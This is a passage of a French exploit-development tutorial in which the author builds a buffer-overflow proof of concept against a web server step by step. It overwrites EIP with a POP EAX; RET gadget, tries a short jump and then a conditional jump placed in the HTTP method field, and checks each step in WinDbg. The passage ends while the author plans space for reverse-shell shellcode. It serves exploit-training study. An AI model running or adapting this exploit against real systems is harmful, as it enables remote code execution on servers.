<a id="__codelineno-28-12" name="__codelineno-28-12" href="#__codelineno-28-12"></a>  <span class="n">inputBuffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">253</span>
<a id="__codelineno-28-13" name="__codelineno-28-13" href="#__codelineno-28-13"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="p">(</span><span class="mh">0x418674</span><span class="p">))</span> <span class="c1"># 0x00418674 : POP EAX ; RET -&gt; EIP</span>
<a id="__codelineno-28-14" name="__codelineno-28-14" href="#__codelineno-28-14"></a>  <span class="n">httpEndRequest</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span>
</code></pre></div>
<p>Exécution de la preuve de concept et positionnement d'un point d'arrêt sur l'adresse où se trouve la série d'instructions <code>POP EAX;RET</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">bp</span> <span class="n">0x00418674</span>
<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="c">#</span>
<a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">g</span>
<a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="n">Breakpoint</span> <span class="n">0</span> <span class="n">hit</span>
<a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a><span class="p">[...]</span>
<a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a><span class="n">00418674</span> <span class="n">58</span>              <span class="n">pop</span>     <span class="n">eax</span>
<a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a><span class="c">#</span>
<a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-29-10" name="__codelineno-29-10" href="#__codelineno-29-10"></a><span class="n">eax</span><span class="p">=</span><span class="n">0464fe70</span>
<a id="__codelineno-29-11" name="__codelineno-29-11" href="#__codelineno-29-11"></a><span class="p">[...]</span>
<a id="__codelineno-29-12" name="__codelineno-29-12" href="#__codelineno-29-12"></a><span class="n">00418675</span> <span class="n">c3</span>              <span class="n">ret</span>
<a id="__codelineno-29-13" name="__codelineno-29-13" href="#__codelineno-29-13"></a><span class="c">#</span>
<a id="__codelineno-29-14" name="__codelineno-29-14" href="#__codelineno-29-14"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">dc</span> <span class="n">poi</span><span class="p">(</span><span class="nv">@esp</span><span class="p">)</span>
<a id="__codelineno-29-15" name="__codelineno-29-15" href="#__codelineno-29-15"></a><span class="n">0464ea84</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">00000000</span> <span class="n">00000000</span>  <span class="n">CCCCCCCC</span><span class="p">........</span>
<a id="__codelineno-29-16" name="__codelineno-29-16" href="#__codelineno-29-16"></a><span class="n">0464ea94</span>  <span class="n">00000000</span> <span class="n">00000000</span> <span class="n">4141412f</span> <span class="n">41414141</span>  <span class="p">......../</span><span class="n">AAAAAAA</span>
<a id="__codelineno-29-17" name="__codelineno-29-17" href="#__codelineno-29-17"></a><span class="n">0464eaa4</span>  <span class="n">41414141</span> <span class="n">41414141</span> <span class="n">41414141</span> <span class="n">41414141</span>  <span class="n">AAAAAAAAAAAAAAAA</span>
<a id="__codelineno-29-18" name="__codelineno-29-18" href="#__codelineno-29-18"></a><span class="p">[...]</span>
</code></pre></div>
<p>On est donc capable de modifier la méthode HTTP sans impacter le crash en lui-même. La méthode est bien remplacée par nos <code>0x43</code> qui correspondent a des <code>C</code>.</p>
<p>On pourrait utiliser un <em>short jump</em>. Jump de <code>0x17</code> bytes devrait permettre d'arriver dans le buffer. On remplace donc la méthode <code>HTTP</code> par les <em>opcodes</em> correspondant à un <em>short jump</em> de <code>0x17</code>.</p>
<p>Mise à jour de la preuve de concept :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="ch">#!/usr/bin/python</span>
<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span>
<a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>
<a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>  <span class="n">server</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a>  <span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>
<a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a>  <span class="n">size</span> <span class="o">=</span> <span class="mi">253</span>
<a id="__codelineno-30-10" name="__codelineno-30-10" href="#__codelineno-30-10"></a>
<a id="__codelineno-30-11" name="__codelineno-30-11" href="#__codelineno-30-11"></a>  <span class="n">httpMethod</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xeb\x17\x90\x90</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot; /&quot;</span> <span class="c1"># Short jump de 0x17</span>
<a id="__codelineno-30-12" name="__codelineno-30-12" href="#__codelineno-30-12"></a>  <span class="n">inputBuffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="n">size</span>
<a id="__codelineno-30-13" name="__codelineno-30-13" href="#__codelineno-30-13"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="p">(</span><span class="mh">0x418674</span><span class="p">))</span> <span class="c1"># 0x00418674 : POP EAX ; RET -&gt; EIP</span>
<a id="__codelineno-30-14" name="__codelineno-30-14" href="#__codelineno-30-14"></a>  <span class="n">httpEndRequest</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span>
</code></pre></div>
<p>Exécution de la preuve de concept et positionnement d'un point d'arrêt sur l'adresse où se trouve la série d'instructions <code>POP EAX;RET</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">bp</span> <span class="n">0x00418674</span>
<a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="c">#</span>
<a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">g</span>
<a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="n">Breakpoint</span> <span class="n">0</span> <span class="n">hit</span>
<a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a><span class="n">00418674</span> <span class="n">58</span>              <span class="n">pop</span>     <span class="n">eax</span>
<a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a><span class="c">#</span>
<a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a><span class="n">00418674</span> <span class="n">58</span>              <span class="n">pop</span>     <span class="n">eax</span>
<a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a><span class="c">#</span>
<a id="__codelineno-31-11" name="__codelineno-31-11" href="#__codelineno-31-11"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-31-12" name="__codelineno-31-12" href="#__codelineno-31-12"></a><span class="n">eax</span><span class="p">=</span><span class="n">0467fe70</span>
<a id="__codelineno-31-13" name="__codelineno-31-13" href="#__codelineno-31-13"></a><span class="n">00418675</span> <span class="n">c3</span>              <span class="n">ret</span>
<a id="__codelineno-31-14" name="__codelineno-31-14" href="#__codelineno-31-14"></a><span class="c">#</span>
<a id="__codelineno-31-15" name="__codelineno-31-15" href="#__codelineno-31-15"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-31-16" name="__codelineno-31-16" href="#__codelineno-31-16"></a><span class="n">eax</span><span class="p">=</span><span class="n">0467fe70</span>
<a id="__codelineno-31-17" name="__codelineno-31-17" href="#__codelineno-31-17"></a><span class="n">0467ea84</span> <span class="n">cb</span>              <span class="n">retf</span>
<a id="__codelineno-31-18" name="__codelineno-31-18" href="#__codelineno-31-18"></a><span class="c">#</span>
<a id="__codelineno-31-19" name="__codelineno-31-19" href="#__codelineno-31-19"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">db</span> <span class="nv">@eip</span> <span class="n">L2</span>
<a id="__codelineno-31-20" name="__codelineno-31-20" href="#__codelineno-31-20"></a><span class="n">0467ea84</span>  <span class="n">cb</span> <span class="n">17</span>
<a id="__codelineno-31-21" name="__codelineno-31-21" href="#__codelineno-31-21"></a><span class="c">#</span>
<a id="__codelineno-31-22" name="__codelineno-31-22" href="#__codelineno-31-22"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">u</span> <span class="nv">@eip</span>
<a id="__codelineno-31-23" name="__codelineno-31-23" href="#__codelineno-31-23"></a><span class="n">0467ea84</span> <span class="n">cb</span>              <span class="n">retf</span>                                           <span class="c"># ERREUR À CET ENDROIT</span>
<a id="__codelineno-31-24" name="__codelineno-31-24" href="#__codelineno-31-24"></a><span class="n">0467ea85</span> <span class="n">17</span>              <span class="n">pop</span>     <span class="n">ss</span>
<a id="__codelineno-31-25" name="__codelineno-31-25" href="#__codelineno-31-25"></a><span class="n">0467ea86</span> <span class="n">90</span>              <span class="n">nop</span>
<a id="__codelineno-31-26" name="__codelineno-31-26" href="#__codelineno-31-26"></a><span class="n">0467ea87</span> <span class="n">90</span>              <span class="n">nop</span>
<a id="__codelineno-31-27" name="__codelineno-31-27" href="#__codelineno-31-27"></a><span class="n">0467ea88</span> <span class="n">0000</span>            <span class="n">add</span>     <span class="n">byte</span> <span class="n">ptr</span> <span class="no">[eax]</span><span class="p">,</span><span class="n">al</span>
<a id="__codelineno-31-28" name="__codelineno-31-28" href="#__codelineno-31-28"></a><span class="p">[...]</span>
</code></pre></div>
<p>La mémoire ne semble pas contenir les bons caractères. Passage de <code>eb17</code> à <code>cb17</code>. Pourtant ce caractère n'apparaissait pas dans les mauvais caractères testés précédemment.</p>
<p>Cet espace mémoire est potentiellement alloué séparément de l'allocation du reste du buffer. Il est possible que des opérations différentes soient faites et entrainent cet effet de bord.</p>
<p>Ceci est un bon exemple démontrant que <strong>différentes allocations mémoires peuvent avoir de mauvais caractères différents</strong>. Il faut trouver une alternative au <em>short jump</em> avec le même résultat.</p>
<h4 id="sauts-conditionnels">Sauts conditionnels</h4>
<p>Les sauts conditionnels ou <em>conditional jumps</em> sont une alternative au <em>short jump</em>. Ils exécutent un saut en fonction de conditions. Ils fonctionnent en deux étapes :</p>
<ul>
<li>Test de la condition</li>
<li>Saut si la condition est vraie ou continue l'exécution si la condition est fausse</li>
</ul>
<p>Il en existe en grand nombre, chacun dépendant de registre <code>FLAG</code> spécifique.</p>
<p>On choisit d'utiliser l'instruction <code>JE</code>. La condition de ce saut est basée sur la valeur du registre <code>ZF</code> (<em>Zero Flag</em>). Le saut se fait uniquement si la valeur de <code>ZF</code> est à <code>1</code> (<code>TRUE</code>).</p>
<p><em>The Zero Flag register is a single bit flag that is used on most architectures. On x86/x64, it is stored in a dedicated register called ZF. This flag is used to check the result of arithmetic operations. It is set to 1 (TRUE) if the result of an arithmetic operation is zero and otherwise set to 0 (FALSE).</em></p>
<p>Il faut donc garantir que <code>ZF</code> soit a <code>1</code> pour assurer la réalisation du saut. Peut être fait en 2 étapes :</p>
<ul>
<li>Appliquer une opération <code>XOR</code> sur <code>ECX</code> en tant que destination et source (premiere et deuxieme operande)<ul>
<li>Ceci aura pour effet de mettre <code>ECX</code> a <code>0</code></li>
</ul>
</li>
<li>Utiliser l'instruction <code>TEST</code> avec <code>ECX</code> dans les deux opérandes<ul>
<li>Ce qui va positionner <code>ZF</code> a <code>1</code></li>
</ul>
</li>
</ul>
<p><em>The </em><em>XOR</em><em> instruction does a bitwise operation. The resultant bit is set to 1 only if the bit from the other operand is different. Using the XOR bitwise operation with the same destination and source will always result in 0. This is a common way to null a register. We chose to use the ECX register for our XOR operation, using other registers will produce the same result.</em></p>
<p><em>The </em><em>TEST</em><em> performs a bit-wise logical AND operation and sets the ZF (amongst others) according to the result. The AND operation sets each bit to 1 if both corresponding bits of the operands are 1, otherwise, it is set to 0.</em></p>
<p>Génération des opcodes correspondants :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="p">$</span> <span class="n">msf-nasm_shell</span>
<a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="n">nasm</span> <span class="p">&gt;</span> <span class="n">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
<a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="n">00000000</span>  <span class="n">31C9</span>              <span class="n">xor</span> <span class="n">ecx</span><span class="p">,</span><span class="n">ecx</span>
<a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="n">nasm</span> <span class="p">&gt;</span> <span class="n">test</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
<a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="n">00000000</span>  <span class="n">85C9</span>              <span class="n">test</span> <span class="n">ecx</span><span class="p">,</span><span class="n">ecx</span>
<a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a><span class="n">nasm</span> <span class="p">&gt;</span> <span class="n">je</span> <span class="n">0x17</span>
<a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a><span class="n">00000000</span>  <span class="n">0F8411000000</span>      <span class="n">jz</span> <span class="n">near</span> <span class="n">0x17</span>              <span class="c"># JE et JZ sont interchangeable</span>
</code></pre></div>
<p>Pas de mauvais caractère dans les opcodes génères par ces instructions, sauf le <code>je</code> qui contient des <em>null bytes</em>. Pas problématique, car l'espace mémoire est mis à <code>000000</code> avant que la méthode <code>HTTP</code> soit copiée dedans. En témoigne <code>0464ea84  43434343 43434343 00000000 00000000  CCCCCCCC........</code>. On peut donc ignorer les <code>000000</code> génères par l'instruction <code>je</code> et utiliser ceux déjà présents en mémoire.</p>
<p>Mise à jour de la preuve de concept :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="ch">#!/usr/bin/python</span>
<a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span>
<a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>
<a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>  <span class="n">server</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>  <span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>
<a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a>  <span class="n">size</span> <span class="o">=</span> <span class="mi">253</span>
<a id="__codelineno-33-10" name="__codelineno-33-10" href="#__codelineno-33-10"></a>
<a id="__codelineno-33-11" name="__codelineno-33-11" href="#__codelineno-33-11"></a>  <span class="n">httpMethod</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x31\xC9\x85\xC9\x0F\x84\x11</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot; /&quot;</span> <span class="c1"># XOR ECX ECX; TEST ECX ECX; JE 0x17</span>
<a id="__codelineno-33-12" name="__codelineno-33-12" href="#__codelineno-33-12"></a>  <span class="n">inputBuffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="n">size</span>
<a id="__codelineno-33-13" name="__codelineno-33-13" href="#__codelineno-33-13"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="p">(</span><span class="mh">0x418674</span><span class="p">))</span> <span class="c1"># 0x00418674 : POP EAX ; RET</span>
<a id="__codelineno-33-14" name="__codelineno-33-14" href="#__codelineno-33-14"></a>  <span class="n">httpEndRequest</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span>
<a id="__codelineno-33-15" name="__codelineno-33-15" href="#__codelineno-33-15"></a>
<a id="__codelineno-33-16" name="__codelineno-33-16" href="#__codelineno-33-16"></a>  <span class="n">buf</span> <span class="o">=</span> <span class="n">httpMethod</span> <span class="o">+</span> <span class="n">inputBuffer</span> <span class="o">+</span>  <span class="n">httpEndRequest</span>
<a id="__codelineno-33-17" name="__codelineno-33-17" href="#__codelineno-33-17"></a>
<a id="__codelineno-33-18" name="__codelineno-33-18" href="#__codelineno-33-18"></a>  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Sending buffer...&quot;</span><span class="p">)</span>
</code></pre></div>
<p>Exécution de la preuve de concept et positionnement d'un point d'arrêt sur l'adresse où se trouve la série d'instructions <code>POP EAX;RET</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">bp</span> <span class="n">0x00418674</span>
<a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="c">#</span>
<a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">g</span>
<a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a><span class="n">Breakpoint</span> <span class="n">0</span> <span class="n">hit</span>
<a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a><span class="n">00418674</span> <span class="n">58</span>              <span class="n">pop</span>     <span class="n">eax</span>
<a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a><span class="c">#</span>
<a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a><span class="n">eax</span><span class="p">=</span><span class="n">022ffe70</span>
<a id="__codelineno-34-10" name="__codelineno-34-10" href="#__codelineno-34-10"></a><span class="n">00418675</span> <span class="n">c3</span>              <span class="n">ret</span>
<a id="__codelineno-34-11" name="__codelineno-34-11" href="#__codelineno-34-11"></a><span class="c">#</span>
<a id="__codelineno-34-12" name="__codelineno-34-12" href="#__codelineno-34-12"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">u</span> <span class="n">poi</span><span class="p">(</span><span class="nv">@esp</span><span class="p">)</span> <span class="n">L3</span>
<a id="__codelineno-34-13" name="__codelineno-34-13" href="#__codelineno-34-13"></a><span class="n">022fea84</span> <span class="n">31c9</span>            <span class="n">xor</span>     <span class="n">ecx</span><span class="p">,</span><span class="n">ecx</span>
<a id="__codelineno-34-14" name="__codelineno-34-14" href="#__codelineno-34-14"></a><span class="n">022fea86</span> <span class="n">85c9</span>            <span class="n">test</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">ecx</span>
<a id="__codelineno-34-15" name="__codelineno-34-15" href="#__codelineno-34-15"></a><span class="n">022fea88</span> <span class="n">0f8411000000</span>    <span class="n">je</span>      <span class="n">022fea9f</span>
</code></pre></div>
<ul>
<li>On affiche le registre <code>ZF</code> juste apres le <code>XOR</code> et le <code>TEST</code><ul>
<li>Le registre est bien a <code>1</code></li>
</ul>
</li>
<li>On execute l'instruction de saut conditionnel <code>JE</code></li>
<li>On voit que <code>EIP</code> est bien initialise a <code>022fea9f</code><ul>
<li>Le flot d'execution est bien redirige suite au <code>je</code></li>
</ul>
</li>
<li><code>EIP</code> pointe bien sur le buffer de <code>0x41</code></li>
</ul>
<div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="p">[...]</span>
<a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a><span class="n">022fea84</span> <span class="n">31c9</span>            <span class="n">xor</span>     <span class="n">ecx</span><span class="p">,</span><span class="n">ecx</span>
<a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a><span class="c">#</span>
<a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a><span class="p">[...]</span>
<a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a><span class="n">022fea86</span> <span class="n">85c9</span>            <span class="n">test</span>    <span class="n">ecx</span><span class="p">,</span><span class="n">ecx</span>
<a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a><span class="c">#</span>
<a id="__codelineno-35-9" name="__codelineno-35-9" href="#__codelineno-35-9"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="nb">r </span><span class="nv">@zf</span>
<a id="__codelineno-35-10" name="__codelineno-35-10" href="#__codelineno-35-10"></a><span class="n">zf</span><span class="p">=</span><span class="n">1</span>
<a id="__codelineno-35-11" name="__codelineno-35-11" href="#__codelineno-35-11"></a><span class="c">#</span>
<a id="__codelineno-35-12" name="__codelineno-35-12" href="#__codelineno-35-12"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">dd</span> <span class="n">022fea9f</span> <span class="p">-</span> <span class="n">4</span>
<a id="__codelineno-35-13" name="__codelineno-35-13" href="#__codelineno-35-13"></a><span class="n">022fea9b</span>  <span class="n">41412f00</span> <span class="n">41414141</span> <span class="n">41414141</span> <span class="n">41414141</span>
<a id="__codelineno-35-14" name="__codelineno-35-14" href="#__codelineno-35-14"></a><span class="n">022feaab</span>  <span class="n">41414141</span> <span class="n">41414141</span> <span class="n">41414141</span> <span class="n">41414141</span>
<a id="__codelineno-35-15" name="__codelineno-35-15" href="#__codelineno-35-15"></a><span class="p">[...]</span>
<a id="__codelineno-35-16" name="__codelineno-35-16" href="#__codelineno-35-16"></a><span class="c"># Le `2f00` correspond a `./`</span>
<a id="__codelineno-35-17" name="__codelineno-35-17" href="#__codelineno-35-17"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">dc</span> <span class="n">022fea9f</span> <span class="p">-</span> <span class="n">4</span>
<a id="__codelineno-35-18" name="__codelineno-35-18" href="#__codelineno-35-18"></a><span class="n">022fea9b</span>  <span class="n">41412f00</span> <span class="n">41414141</span> <span class="n">41414141</span> <span class="n">41414141</span>  <span class="p">./</span><span class="n">AAAAAAAAAAAAAA</span>
<a id="__codelineno-35-19" name="__codelineno-35-19" href="#__codelineno-35-19"></a><span class="n">022feaab</span>  <span class="n">41414141</span> <span class="n">41414141</span> <span class="n">41414141</span> <span class="n">41414141</span>  <span class="n">AAAAAAAAAAAAAAAA</span>
<a id="__codelineno-35-20" name="__codelineno-35-20" href="#__codelineno-35-20"></a><span class="p">[...]</span>
<a id="__codelineno-35-21" name="__codelineno-35-21" href="#__codelineno-35-21"></a><span class="c">#</span>
<a id="__codelineno-35-22" name="__codelineno-35-22" href="#__codelineno-35-22"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-35-23" name="__codelineno-35-23" href="#__codelineno-35-23"></a><span class="n">eip</span><span class="p">=</span><span class="n">022fea88</span>
<a id="__codelineno-35-24" name="__codelineno-35-24" href="#__codelineno-35-24"></a><span class="n">022fea88</span> <span class="n">0f8411000000</span>    <span class="n">je</span>      <span class="n">022fea9f</span>                                <span class="p">[</span><span class="n">br</span><span class="p">=</span><span class="n">1</span><span class="p">]</span>
<a id="__codelineno-35-25" name="__codelineno-35-25" href="#__codelineno-35-25"></a><span class="c">#</span>
<a id="__codelineno-35-26" name="__codelineno-35-26" href="#__codelineno-35-26"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-35-27" name="__codelineno-35-27" href="#__codelineno-35-27"></a><span class="n">eip</span><span class="p">=</span><span class="n">022fea9f</span>
<a id="__codelineno-35-28" name="__codelineno-35-28" href="#__codelineno-35-28"></a><span class="n">022fea9f</span> <span class="n">41</span>              <span class="n">inc</span>     <span class="n">ecx</span>
<a id="__codelineno-35-29" name="__codelineno-35-29" href="#__codelineno-35-29"></a><span class="c">#</span>
<a id="__codelineno-35-30" name="__codelineno-35-30" href="#__codelineno-35-30"></a><span class="n">0</span><span class="p">:</span><span class="n">004</span><span class="p">&gt;</span> <span class="n">u</span> <span class="nv">@eip</span>
<a id="__codelineno-35-31" name="__codelineno-35-31" href="#__codelineno-35-31"></a><span class="n">022fea9f</span> <span class="n">41</span>              <span class="n">inc</span>     <span class="n">ecx</span>
<a id="__codelineno-35-32" name="__codelineno-35-32" href="#__codelineno-35-32"></a><span class="n">022feaa0</span> <span class="n">41</span>              <span class="n">inc</span>     <span class="n">ecx</span>
<a id="__codelineno-35-33" name="__codelineno-35-33" href="#__codelineno-35-33"></a><span class="n">022feaa1</span> <span class="n">41</span>              <span class="n">inc</span>     <span class="n">ecx</span>
<a id="__codelineno-35-34" name="__codelineno-35-34" href="#__codelineno-35-34"></a><span class="p">[...]</span>
</code></pre></div>
<p>Le buffer de <code>0x41</code> fait 251 bytes, ce qui est trop petit pour un shellcode de reverse shell (environ 300 bytes) et beaucoup trop petit pour un shellcode de Meterpreter.</p>
<p>On pourrait utiliser un plus petit shellcode ou trouver un moyen de stocker un shellcode plus grand.</p>
<h3 id="trouver-de-lespace-supplementaire">Trouver de l'espace supplémentaire</h3>
<p>L'espace du payload étant limité, il faut trouver un <em>buffer</em> additionnel dans une autre région de la mémoire avant le crash et de rediriger le flot d'exécution vers ce buffer. Si on arrive à stocker un <em>buffer</em> plus large ailleurs on peut utiliser le premier  <em>buffer</em> pour écrire un <em>shellcode</em> de type <em>stage one</em>. L'objectif de ce <em>shellcode</em> sera de rediriger le flot d'exécution vers le deuxième buffer ou on aura assez de place pour stocker un payload plus large.</p>
<p>Pour déterminer ce qui va être stocke dans la mémoire de notre application</p>
<ul>
<li>Soit faire du <em>reverse engineering</em></li>
